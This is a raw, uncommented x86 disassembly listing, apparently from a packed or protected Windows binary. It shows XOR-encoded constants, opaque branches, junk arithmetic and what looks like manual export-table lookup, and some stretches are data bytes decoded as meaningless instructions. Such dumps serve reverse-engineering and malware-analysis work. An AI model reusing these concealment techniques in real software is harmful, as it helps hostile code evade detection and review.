  420e29:	and    BYTE PTR [ecx+eiz*2],ah
  420e2c:	int    0xc1
  420e2e:	inc    esp
  420e2f:	es xor eax,0xaa58ab6c
  420e35:	dec    ebx
  420e36:	mov    ch,0x33
  420e38:	ins    DWORD PTR es:[edi],dx
  420e39:	push   esp
  420e3a:	sbb    bl,dl
  420e3c:	xor    al,0x74
  420e3e:	mov    cl,BYTE PTR [eax-0x13e36291]
  420e44:	fwait
  420e45:	cmp    bl,ch
  420e47:	mov    BYTE PTR [ecx-0x30],ch
  420e4a:	xor    BYTE PTR [esi-0x383e86be],ch
  420e50:	js     0x420e74
  420e52:	fwait
  420e53:	and    BYTE PTR [ebx-0x7eb2900d],ch
  420e59:	jmp    0x358b:0x29ad
  420e60:	fwait
  420e61:	add    DWORD PTR [edx+0x0],0x838f3519
  420e68:	inc    edx
  420e69:	add    BYTE PTR [edi],cl
  420e6b:	scas   eax,DWORD PTR es:[edi]
  420e6c:	rol    BYTE PTR [ebx+0x4283ab3d],1
  420e72:	add    BYTE PTR [eax],al
  420e74:	mov    DWORD PTR ds:0x428263,ebx
  420e7a:	mov    DWORD PTR ds:0x42819b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42818f
  420e8e:	mov    DWORD PTR ds:0x428273,0x776f
  420e98:	cmp    DWORD PTR ds:0x4283ab,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428247
  420eaa:	push   0x4280af
  420eaf:	call   DWORD PTR ds:0x428e68
  420eb5:	add    ecx,DWORD PTR ds:0x4283a7
  420ebb:	xor    esi,DWORD PTR ds:0x42823f
  420ec1:	adc    DWORD PTR ds:0x428297,edx
  420ec7:	xor    DWORD PTR ds:0x42831f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42824b
  420ed3:	or     esi,DWORD PTR ds:0x4281a7
  420ed9:	mov    DWORD PTR ds:0x42824b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42827f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428167
  420eef:	sbb    eax,DWORD PTR ds:0x42831b
  420ef5:	mov    ds:0x428167,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428217
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42836f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42831f,0x0
  420f23:	mov    DWORD PTR ds:0x4282b3,0x1362
  420f2d:	mov    DWORD PTR ds:0x428263,edx
  420f33:	mov    DWORD PTR ds:0x42829f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428383,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42831f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428ee0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281ef
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281fb
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428277,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42826f
  420f87:	sbb    edx,DWORD PTR ds:0x4283b7
  420f8d:	mov    DWORD PTR ds:0x42826f,edx
  420f93:	add    DWORD PTR ds:0x4281ab,ecx
  420f99:	sub    DWORD PTR ds:0x42839b,0x42830b
  420fa3:	cmp    DWORD PTR ds:0x428297,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42837b
  420fb0:	movzx  edx,BYTE PTR ds:0x428183
  420fb7:	mov    DWORD PTR ds:0x428307,0x5580
  420fc1:	mov    DWORD PTR ds:0x4283b3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283b7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428297,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d84
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428317
  421000:	sbb    DWORD PTR ds:0x428293,edx
  421006:	movzx  edx,WORD PTR ds:0x42816b
  42100d:	or     edx,DWORD PTR ds:0x428393
  421013:	mov    DWORD PTR ds:0x42816b,edx
  421019:	dec    DWORD PTR ds:0x428383
  42101f:	sub    DWORD PTR ds:0x42828f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42817b,0x0
  421048:	mov    DWORD PTR ds:0x428387,0x62d9
  421052:	mov    DWORD PTR ds:0x428167,0x300d
  42105c:	mov    DWORD PTR ds:0x42816b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x42830f
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42837f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42817b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428da4
  4210a1:	sbb    ecx,DWORD PTR ds:0x428293
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282b7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428173
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x42223d
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x421380
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x63bc:0x65828d2a
  42115b:	or     edi,DWORD PTR [ebx]
  42115d:	mov    esi,0x18160fc1
  421162:	in     al,dx
  421163:	adc    al,0x18
  421165:	sbb    BYTE PTR [eax-0x740957ed],bl
  42116b:	mov    esp,ebp
  42116d:	pop    ds
  42116e:	mov    WORD PTR [eax],ds
  421170:	dec    ebx
  421171:	jne    0x421159
  421173:	mov    ecx,0x90a0d3c1
  421178:	sahf   
  421179:	repz push cs
  42117b:	arpl   si,bp
  42117d:	cmp    DWORD PTR [eax-0x2a583e1],ebp
  421183:	cwde   
  421184:	int    0x50
  421186:	shl    DWORD PTR [ebp-0x24],cl
  421189:	ins    DWORD PTR es:[edi],dx
  42118a:	inc    ebx
  42118b:	xchg   ebp,eax
  42118c:	and    BYTE PTR [edx],dh
  42118e:	mov    al,0x4f
  421190:	add    edx,ecx
  421192:	cdq    
  421193:	xchg   esp,eax
  421194:	push   ss
  421195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421196:	loop   0x421120
  421198:	pop    ds
  421199:	mov    bl,0x27
  42119b:	fist   DWORD PTR [esi-0x45]
  42119e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42119f:	fidivr DWORD PTR [edi+0x45cbd886]
  4211a5:	pop    es
  4211a6:	pop    ebp
  4211a7:	loope  0x42116d
  4211a9:	inc    ecx
  4211aa:	inc    eax
  4211ab:	les    esi,FWORD PTR [edx+0x2c158f1a]
  4211b1:	(bad)  
  4211b2:	jno    0x42117a
  4211b4:	ret    
  4211b5:	and    eax,0xf738efe9
  4211ba:	push   eax
  4211bb:	xor    al,0x9e
  4211bd:	dec    ecx
  4211be:	dec    ebx
  4211bf:	popf   
  4211c0:	scas   al,BYTE PTR es:[edi]
  4211c1:	xor    esp,edi
  4211c3:	pop    esp
  4211c4:	xor    eax,0x59c28fed
  4211c9:	pusha  
  4211ca:	fdivp  st(7),st
  4211cc:	xor    al,BYTE PTR [ecx-0x1]
  4211cf:	adc    eax,0xd786c321
  4211d4:	jne    0x421254
  4211d6:	cmp    BYTE PTR [edi],bl
  4211d8:	mov    dh,0xb3
  4211da:	out    0xa9,eax
  4211dc:	aad    0x8e
  4211de:	jg     0x42118a
  4211e0:	ss xchg esi,eax
  4211e2:	(bad)  
  4211e3:	sti    
  4211e4:	cmc    
  4211e5:	sbb    esi,0xffffffde
  4211e8:	cmp    al,0x9a
  4211ea:	jp     0x42122b
  4211ec:	pop    esp
  4211ed:	cmp    BYTE PTR [edi-0x65c82788],bh
  4211f3:	push   0x7648ce3e
  4211f8:	out    dx,eax
  4211f9:	cmp    eax,0x6070ced5
  4211fe:	leave  
  4211ff:	frstor gs:[ecx+0x3810ec50]
  421206:	pop    ebp
  421207:	add    ebp,DWORD PTR [ecx+0x5d]
  42120a:	jge    0x4211b0
  42120c:	scas   al,BYTE PTR es:[edi]
  42120d:	pop    esp
  42120e:	push   ecx
  42120f:	cmc    
  421210:	or     ecx,ecx
  421212:	xor    edx,0xffffff95
  421215:	addr16 and ebp,ebp
  421218:	jbe    0x42125d
  42121a:	fsubr  st,st(3)
  42121c:	fiadd  WORD PTR [edx]
  42121e:	mov    bl,BYTE PTR [edi+0x2d]
  421221:	xchg   BYTE PTR [edi-0xd],al
  421224:	and    esi,DWORD PTR [ecx]
  421226:	int    0xca
  421228:	leave  
  421229:	aas    
  42122a:	sbb    eax,0xe8c52d95
  42122f:	cmp    al,0xca
  421231:	xchg   ebp,eax
  421232:	dec    eax
  421233:	push   ss
  421234:	add    al,0x57
  421236:	imul   esp,DWORD PTR [ebp-0x6fa0e647],0x6b140dbc
  421240:	sbb    ah,dl
  421242:	adc    DWORD PTR [ebp+0x31],edx
  421245:	xlat   BYTE PTR ds:[ebx]
  421246:	push   ecx
  421247:	mov    WORD PTR es:[edi],?
  42124a:	aas    
  42124b:	sub    al,0x70
  42124d:	neg    BYTE PTR [ecx-0x77]
  421250:	inc    esp
  421251:	mov    WORD PTR [edi],es
  421253:	adc    eax,0x20786d61
  421258:	mov    WORD PTR [eax+ebp*1+0x3a030024],cs
  42125f:	jo     0x421279
  421261:	int    0xa2
  421263:	clc    
  421264:	out    dx,eax
  421265:	loopne 0x421281
  421267:	jp     0x421243
  421269:	mov    cl,0xef
  42126b:	ret    0xdc5e
  42126e:	xor    ah,BYTE PTR [ecx]
  421270:	xor    cl,0xac
  421273:	ror    DWORD PTR [esi-0x65],0xd5
  421277:	inc    esp
  421278:	aaa    
  421279:	in     al,dx
  42127a:	add    ch,BYTE PTR [ebp-0x5d]
  42127d:	sub    al,0xc3
  42127f:	jmp    0x2af8be20
  421284:	in     eax,0x7b
  421286:	xor    bh,al
  421288:	mov    ds:0xe1351f3b,al
  42128d:	outs   dx,BYTE PTR ds:[esi]
  42128e:	shl    bl,1
  421290:	call   DWORD PTR [eax-0x2]
  421293:	ins    DWORD PTR es:[edi],dx
  421294:	add    BYTE PTR [ebx],ch
  421296:	mov    ebp,ebx
  421298:	jl     0x421297
  42129a:	or     DWORD PTR [esi],0xffffffab
  42129d:	jge    0x4212ed
  42129f:	cs ja  0x421314
  4212a2:	push   ebp
  4212a3:	imul   edi,DWORD PTR [ebp-0x642bb811],0xc
  4212aa:	fnstcw WORD PTR [edx-0x64fe77c0]
  4212b0:	cmovo  esp,DWORD PTR [eax]
  4212b3:	jnp    0x4212b4
  4212b5:	pop    eax
  4212b6:	iret   
  4212b7:	out    dx,al
  4212b8:	pop    esi
  4212b9:	mov    BYTE PTR [esi],0xc7
  4212bc:	or     eax,0x8539116d
  4212c1:	test   edi,ebx
  4212c3:	test   dl,0x43
  4212c6:	jmp    0xede3825a
  4212cb:	adc    DWORD PTR [edi-0x68098102],ecx
  4212d1:	mov    dh,0x1b
  4212d3:	in     eax,0x66
  4212d5:	aas    
  4212d6:	sbb    al,0xa1
  4212d8:	(bad)
  4212db:	fist   WORD PTR [eax+0xc09d264]
  4212e1:	cs je  0x4212c2
  4212e4:	xor    eax,0x2eb8334a
  4212e9:	pusha  
  4212ea:	mov    eax,0x8ce26f50
  4212ef:	mov    ch,BYTE PTR [ebp+0x1a21838]
  4212f5:	in     al,dx
  4212f6:	mov    esp,0xf93ccf2f
  4212fb:	add    esp,edx
  4212fd:	jo     0x42128d
  4212ff:	xchg   DWORD PTR [ecx+0x4f],ebx
  421302:	mov    cl,0x9
  421304:	mov    esp,0x9dea3fb0
  421309:	jl     0x42131b
  42130b:	jo     0x4212db
  42130d:	or     ah,BYTE PTR [eax-0x1983525]
  421313:	sub    BYTE PTR [edx],dh
  421315:	adc    bl,BYTE PTR [ecx]
  421317:	test   al,0x21
  421319:	std    
  42131a:	test   DWORD PTR [ecx+0xc22eb26],esi
  421320:	adc    BYTE PTR [esi],al
  421322:	gs push 0x2af8cb6a
  421328:	add    ecx,edx
  42132a:	xchg   esp,eax
  42132b:	in     eax,0x87
  42132d:	jge    0x4212d9
  42132f:	push   ecx
  421330:	mov    ds:0x6e73bb25,eax
  421335:	shl    esi,cl
  421337:	inc    edi
  421338:	sbb    ebp,DWORD PTR [edi]
  42133a:	add    edx,DWORD PTR [edi+0x236d0bfa]
  421340:	mov    ?,WORD PTR ds:0xc9ec5b47
  421346:	jg     0x4213b3
  421348:	mov    ch,0x2c
  42134a:	nop
  42134b:	dec    ebp
  42134c:	call   0x102ce741
  421351:	pusha  
  421352:	pusha  
  421353:	jmp    0x4212ee
  421355:	mov    dh,0xd9
  421357:	in     al,0x14
  421359:	xlat   BYTE PTR ds:[ebx]
  42135a:	mov    ebp,0xd2f490da
  42135f:	mov    dl,BYTE PTR [esi-0x4f]
  421362:	mov    ds:0x78d6c4cf,al
  421367:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  421369:	stos   BYTE PTR es:[edi],al
  42136a:	adc    DWORD PTR [edx],esp
  42136c:	xor    DWORD PTR [ecx+0x5],esp
  42136f:	test   BYTE PTR [eax+0x6b0fa570],ah
  421375:	cmp    eax,0xe0f18e48
  42137a:	lea    ecx,[ecx-0x6c3bf941]
  421380:	mov    eax,DWORD PTR [ebp-0x15c]
  421386:	mov    edx,DWORD PTR [ebp-0x158]
  42138c:	xor    eax,0xca79a575
  421391:	xor    edx,0x9c1b89e8
  421397:	mov    cl,0x2
  421399:	call   0x40a9b5
  42139e:	mov    ecx,edx
  4213a0:	mov    edx,DWORD PTR [ebp-0x15c]
  4213a6:	mov    DWORD PTR [ebp-0x218],esi
  4213ac:	mov    esi,DWORD PTR [ebp-0x158]
  4213b2:	xor    edx,0xca79a575
  4213b8:	xor    esi,0x9c1b89e8
  4213be:	mov    DWORD PTR [ebp-0x21c],eax
  4213c4:	mov    eax,edx
  4213c6:	mov    edx,esi
  4213c8:	mov    DWORD PTR [ebp-0x220],ecx
  4213ce:	mov    cl,0x3e
  4213d0:	call   0x42223d
  4213d5:	mov    esi,DWORD PTR [ebp-0x21c]
  4213db:	or     esi,eax
  4213dd:	mov    eax,DWORD PTR [ebp-0x220]
  4213e3:	or     eax,edx
  4213e5:	push   eax
  4213e6:	push   esi
  4213e7:	push   ebx
  4213e8:	push   edi
  4213e9:	call   0x416c20
  4213ee:	mov    esi,DWORD PTR [ebp-0x218]
  4213f4:	cmp    esi,eax
  4213f6:	jne    0x4214ac
  4213fc:	mov    eax,DWORD PTR [ebp-0x154]
  421402:	mov    edx,DWORD PTR [ebp-0x150]
  421408:	xor    eax,0xca79a575
  42140d:	xor    edx,0x9c1b89e8
  421413:	mov    cl,0x2
  421415:	call   0x40a9b5
  42141a:	mov    esi,eax
  42141c:	mov    edi,edx
  42141e:	mov    eax,DWORD PTR [ebp-0x154]
  421424:	mov    edx,DWORD PTR [ebp-0x150]
  42142a:	xor    eax,0xca79a575
  42142f:	xor    edx,0x9c1b89e8
  421435:	mov    cl,0x3e
  421437:	call   0x42223d
  42143c:	or     esi,eax
  42143e:	or     edi,edx
  421440:	mov    eax,DWORD PTR [ebp-0x15c]
  421446:	mov    edx,DWORD PTR [ebp-0x158]
  42144c:	xor    eax,0xca79a575
  421451:	xor    edx,0x9c1b89e8
  421457:	mov    cl,0x2
  421459:	call   0x40a9b5
  42145e:	mov    ebx,eax
  421460:	mov    eax,edx
  421462:	mov    ecx,DWORD PTR [ebp-0x15c]
  421468:	mov    edx,DWORD PTR [ebp-0x158]
  42146e:	xor    ecx,0xca79a575
  421474:	xor    edx,0x9c1b89e8
  42147a:	mov    DWORD PTR [ebp-0x224],eax
  421480:	mov    eax,ecx
  421482:	mov    cl,0x3e
  421484:	call   0x42223d
  421489:	or     ebx,eax
  42148b:	mov    eax,DWORD PTR [ebp-0x224]
  421491:	or     eax,edx
  421493:	push   eax
  421494:	push   ebx
  421495:	push   edi
  421496:	push   esi
  421497:	call   0x416c20
  42149c:	mov    DWORD PTR [ebp-0x178],eax
  4214a2:	jmp    0x42176c
  4214a7:	jmp    0x421722
  4214ac:	lea    eax,[ebp-0x168]
  4214b2:	mov    DWORD PTR [ebp-0x164],eax
  4214b8:	mov    eax,DWORD PTR [ebp-0x164]
  4214be:	mov    DWORD PTR [eax],0xa4069aae
  4214c4:	mov    eax,DWORD PTR [ebp-0x168]
  4214ca:	xor    eax,0xa4069aae
  4214cf:	shr    eax,0x2
  4214d2:	mov    ecx,DWORD PTR [ebp-0x168]
  4214d8:	xor    ecx,0xa4069aae
  4214de:	shl    ecx,0x1e
  4214e1:	or     eax,ecx
  4214e3:	mov    ecx,DWORD PTR [ebp-0x174]
  4214e9:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214ed:	mov    DWORD PTR [ebp-0x160],eax
  4214f3:	mov    esi,DWORD PTR [ebp-0x160]
  4214f9:	mov    eax,DWORD PTR [ebp-0x154]
  4214ff:	mov    edx,DWORD PTR [ebp-0x150]
  421505:	xor    eax,0xca79a575
  42150a:	xor    edx,0x9c1b89e8
  421510:	mov    cl,0x2
  421512:	call   0x40a9b5
  421517:	mov    edi,eax
  421519:	mov    ebx,edx
  42151b:	mov    eax,DWORD PTR [ebp-0x154]
  421521:	mov    edx,DWORD PTR [ebp-0x150]
  421527:	xor    eax,0xca79a575
  42152c:	xor    edx,0x9c1b89e8
  421532:	mov    cl,0x3e
  421534:	call   0x42223d
  421539:	or     edi,eax
  42153b:	or     ebx,edx
  42153d:	mov    eax,DWORD PTR [ebp-0x15c]
  421543:	mov    edx,DWORD PTR [ebp-0x158]
  421549:	xor    eax,0xca79a575
  42154e:	xor    edx,0x9c1b89e8
  421554:	mov    cl,0x2
  421556:	call   0x40a9b5
  42155b:	mov    ecx,edx
  42155d:	mov    edx,DWORD PTR [ebp-0x15c]
  421563:	mov    DWORD PTR [ebp-0x228],esi
  421569:	mov    esi,DWORD PTR [ebp-0x158]
  42156f:	xor    edx,0xca79a575
  421575:	xor    esi,0x9c1b89e8
  42157b:	mov    DWORD PTR [ebp-0x22c],eax
  421581:	mov    eax,edx
  421583:	mov    edx,esi
  421585:	mov    DWORD PTR [ebp-0x230],ecx
  42158b:	mov    cl,0x3e
  42158d:	call   0x42223d
  421592:	mov    esi,DWORD PTR [ebp-0x22c]
  421598:	or     esi,eax
  42159a:	mov    eax,DWORD PTR [ebp-0x230]
  4215a0:	or     eax,edx
  4215a2:	push   eax
  4215a3:	push   esi
  4215a4:	push   ebx
  4215a5:	push   edi
  4215a6:	call   0x416c20
  4215ab:	mov    esi,DWORD PTR [ebp-0x228]
  4215b1:	cmp    esi,eax
  4215b3:	je     0x421628
  4215b9:	mov    eax,DWORD PTR [ebp-0x154]
  4215bf:	mov    edx,DWORD PTR [ebp-0x150]
  4215c5:	xor    eax,0xca79a575
  4215ca:	xor    edx,0x9c1b89e8
  4215d0:	mov    cl,0x2
  4215d2:	call   0x40a9b5
  4215d7:	mov    esi,eax
  4215d9:	mov    edi,edx
  4215db:	mov    eax,DWORD PTR [ebp-0x154]
  4215e1:	mov    edx,DWORD PTR [ebp-0x150]
  4215e7:	xor    eax,0xca79a575
  4215ec:	xor    edx,0x9c1b89e8
  4215f2:	mov    cl,0x3e
  4215f4:	call   0x42223d
  4215f9:	or     esi,eax
  4215fb:	or     edi,edx
  4215fd:	mov    eax,DWORD PTR [ebp-0x160]
  421603:	imul   esi,eax
  421606:	add    esi,DWORD PTR [ebp-0x170]
  42160c:	mov    DWORD PTR [ebp-0x16c],esi
  421612:	mov    eax,DWORD PTR [ebp-0x16c]
  421618:	mov    DWORD PTR [ebp-0x178],eax
  42161e:	jmp    0x42176c
  421623:	jmp    0x4216d3
  421628:	mov    eax,DWORD PTR [ebp-0x154]
  42162e:	mov    edx,DWORD PTR [ebp-0x150]
  421634:	xor    eax,0xca79a575
  421639:	xor    edx,0x9c1b89e8
  42163f:	mov    cl,0x2
  421641:	call   0x40a9b5
  421646:	mov    esi,eax
  421648:	mov    edi,edx
  42164a:	mov    eax,DWORD PTR [ebp-0x154]
  421650:	mov    edx,DWORD PTR [ebp-0x150]
  421656:	xor    eax,0xca79a575
  42165b:	xor    edx,0x9c1b89e8
  421661:	mov    cl,0x3e
  421663:	call   0x42223d
  421668:	or     esi,eax
  42166a:	or     edi,edx
  42166c:	mov    eax,DWORD PTR [ebp-0x15c]
  421672:	mov    edx,DWORD PTR [ebp-0x158]
  421678:	xor    eax,0xca79a575
  42167d:	xor    edx,0x9c1b89e8
  421683:	mov    cl,0x2
  421685:	call   0x40a9b5
  42168a:	mov    ebx,eax
  42168c:	mov    eax,edx
  42168e:	mov    ecx,DWORD PTR [ebp-0x15c]
  421694:	mov    edx,DWORD PTR [ebp-0x158]
  42169a:	xor    ecx,0xca79a575
  4216a0:	xor    edx,0x9c1b89e8
  4216a6:	mov    DWORD PTR [ebp-0x234],eax
  4216ac:	mov    eax,ecx
  4216ae:	mov    cl,0x3e
  4216b0:	call   0x42223d
  4216b5:	or     ebx,eax
  4216b7:	mov    eax,DWORD PTR [ebp-0x234]
  4216bd:	or     eax,edx
  4216bf:	push   eax
  4216c0:	push   ebx
  4216c1:	push   edi
  4216c2:	push   esi
  4216c3:	call   0x416c20
  4216c8:	mov    DWORD PTR [ebp-0x178],eax
  4216ce:	jmp    0x42176c
  4216d3:	mov    eax,DWORD PTR [ebp-0x15c]
  4216d9:	mov    edx,DWORD PTR [ebp-0x158]
  4216df:	xor    eax,0xca79a575
  4216e4:	xor    edx,0x9c1b89e8
  4216ea:	mov    cl,0x2
  4216ec:	call   0x40a9b5
  4216f1:	mov    esi,eax
  4216f3:	mov    edi,edx
  4216f5:	mov    eax,DWORD PTR [ebp-0x15c]
  4216fb:	mov    edx,DWORD PTR [ebp-0x158]
  421701:	xor    eax,0xca79a575
  421706:	xor    edx,0x9c1b89e8
  42170c:	mov    cl,0x3e
  42170e:	call   0x42223d
  421713:	or     esi,eax
  421715:	or     edi,edx
  421717:	mov    DWORD PTR [ebp-0x178],esi
  42171d:	jmp    0x42176c
  421722:	mov    eax,DWORD PTR [ebp-0x15c]
  421728:	mov    edx,DWORD PTR [ebp-0x158]
  42172e:	xor    eax,0xca79a575
  421733:	xor    edx,0x9c1b89e8
  421739:	mov    cl,0x2
  42173b:	call   0x40a9b5
  421740:	mov    esi,eax
  421742:	mov    edi,edx
  421744:	mov    eax,DWORD PTR [ebp-0x15c]
  42174a:	mov    edx,DWORD PTR [ebp-0x158]
  421750:	xor    eax,0xca79a575
  421755:	xor    edx,0x9c1b89e8
  42175b:	mov    cl,0x3e
  42175d:	call   0x42223d
  421762:	or     esi,eax
  421764:	or     edi,edx
  421766:	mov    DWORD PTR [ebp-0x178],esi
  42176c:	mov    ecx,DWORD PTR [ebp-0xd8]
  421772:	mov    eax,0x459a
  421777:	xor    edx,edx
  421779:	div    ecx
  42177b:	mov    ecx,DWORD PTR [ebp-0xdc]
  421781:	and    eax,ecx
  421783:	add    eax,DWORD PTR [ebp-0x44]
  421786:	mov    ecx,DWORD PTR [ebp-0xe0]
  42178c:	lea    eax,[eax+ecx*1+0x272f]
  421793:	xor    eax,0x1080c
  421798:	add    eax,DWORD PTR [ebp-0x178]
  42179e:	mov    DWORD PTR [ebp-0xe8],eax
  4217a4:	mov    DWORD PTR [ebp-0xc],0x5950
  4217ab:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217b5:	mov    DWORD PTR [ebp-0x130],0x3
  4217bf:	mov    DWORD PTR [ebp-0x20],0x2df9
  4217c6:	mov    DWORD PTR [ebp-0x8],0x4524
  4217cd:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217d7:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217e1:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217eb:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217f5:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217ff:	mov    eax,DWORD PTR [ebp-0xf8]
  421805:	mov    ecx,DWORD PTR [ebp-0x130]
  42180b:	xor    edx,edx
  42180d:	div    ecx
  42180f:	add    eax,0x454e
  421814:	mov    ecx,DWORD PTR [ebp-0xc]
  421817:	and    eax,ecx
  421819:	xor    eax,0x5940
  42181e:	add    eax,DWORD PTR [ebp+0x8]
  421821:	mov    ecx,DWORD PTR [ebp-0x110]
  421827:	mov    edx,DWORD PTR [ebp-0xa4]
  42182d:	sub    ecx,edx
  42182f:	mov    edx,DWORD PTR [ebp-0xd4]
  421835:	or     ecx,edx
  421837:	mov    edx,DWORD PTR [ebp-0x8]
  42183a:	and    ecx,edx
  42183c:	mov    edx,DWORD PTR [ebp-0x20]
  42183f:	xor    ecx,edx
  421841:	mov    edx,DWORD PTR [ebp-0x10c]
  421847:	mov    esi,0x180f
  42184c:	sub    esi,edx
  42184e:	mov    edx,DWORD PTR [ebp-0xa0]
  421854:	imul   esi,edx
  421857:	xor    esi,0x402b
  42185d:	xor    esi,0xfed78c17
  421863:	mov    edx,DWORD PTR [ebp-0xe8]
  421869:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  421870:	add    ecx,eax
  421872:	add    esi,ecx
  421874:	mov    DWORD PTR [ebp-0x38],esi
  421877:	mov    DWORD PTR [ebp-0x4],0x59a8
  42187e:	mov    DWORD PTR [ebp-0x30],0x7021
  421885:	mov    DWORD PTR [ebp-0xf4],0x6210
  42188f:	mov    DWORD PTR [ebp-0x58],0x73d5
  421896:	mov    DWORD PTR [ebp-0x124],0x1e7d
  4218a0:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218a7:	mov    eax,DWORD PTR [ebp-0x30]
  4218aa:	xor    eax,0x75cb
  4218af:	mov    ecx,DWORD PTR [ebp-0x4]
  4218b2:	imul   eax,ecx
  4218b5:	mov    ecx,DWORD PTR [ebp+0x8]
  4218b8:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218bf:	mov    eax,DWORD PTR [ebp-0xf4]
  4218c5:	and    eax,0x6b34
  4218ca:	and    eax,0x658d
  4218cf:	xor    edx,edx
  4218d1:	push   0x6
  4218d3:	pop    esi
  4218d4:	div    esi
  4218d6:	imul   eax,eax,0x3fb9
  4218dc:	mov    edx,DWORD PTR [ebp-0x3c]
  4218df:	and    edx,0x58c7
  4218e5:	mov    esi,DWORD PTR [ebp-0x124]
  4218eb:	or     edx,esi
  4218ed:	add    edx,0x7a25
  4218f3:	imul   edx,edx,0x28d2
  4218f9:	mov    esi,DWORD PTR [ebp-0x58]
  4218fc:	xor    edx,esi
  4218fe:	xor    edx,0x1856f731
  421904:	mov    esi,DWORD PTR [ebp-0xe8]
  42190a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421911:	add    eax,ecx
  421913:	add    edx,eax
  421915:	mov    DWORD PTR [ebp-0xac],edx
  42191b:	mov    DWORD PTR [ebp-0x54],0x1
  421922:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421929:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421930:	mov    DWORD PTR [ebp-0xf0],0x5a06
  42193a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421944:	mov    DWORD PTR [ebp-0x104],0x2108
  42194e:	mov    eax,DWORD PTR [ebp-0x1c]
  421951:	xor    edx,edx
  421953:	push   0x3
  421955:	pop    ecx
  421956:	div    ecx
  421958:	mov    ecx,DWORD PTR [ebp-0x40]
